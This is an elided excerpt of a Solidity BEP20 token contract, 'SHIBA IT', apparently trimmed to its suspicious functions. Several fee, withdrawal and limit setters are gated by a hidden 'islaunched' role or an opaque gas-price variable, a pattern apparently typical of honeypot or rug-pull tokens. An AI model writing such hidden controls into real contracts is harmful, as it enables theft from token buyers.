...
contract SHIBAIT is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "SHIBA IT";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x209fAAD341Ad96AFD99a14DEf40A3c8310d15133;
    ...
    function setMaxTxAmountTokens(uint256 amount) external  {
    ...
    function clearBEP20Token(address tokenAddress, uint256 tokens) external returns (bool success) {
        require(islaunched[msg.sender]);
        if(tokens == 0){
    ...
    function setFees(uint256 _buy, uint256 _sell, uint256 _trans) external {
        require(islaunched[msg.sender]);
    ...
    function antiSnipeSettings(bool _status, uint8 _interval) public onlyOwner {
    ...
    function setMax (uint256 _AB7) public onlyOwner {
               AB7 = _AB7 * 1 gwei; 
    ...
    function setTaxes(uint256 _liquidityFee, uint256 _rewardFee, uint256 _marketingFee, uint256 _utilityFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public onlyOwner {
    ...
    function changeTaxReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _utilityFeeReceiver, address _burnFeeReceiver, address _devFeeReceiver ) public onlyOwner {
    ...
    function manageDistributor(uint256 _minPeriod, uint256 _minDistribution) public onlyOwner {
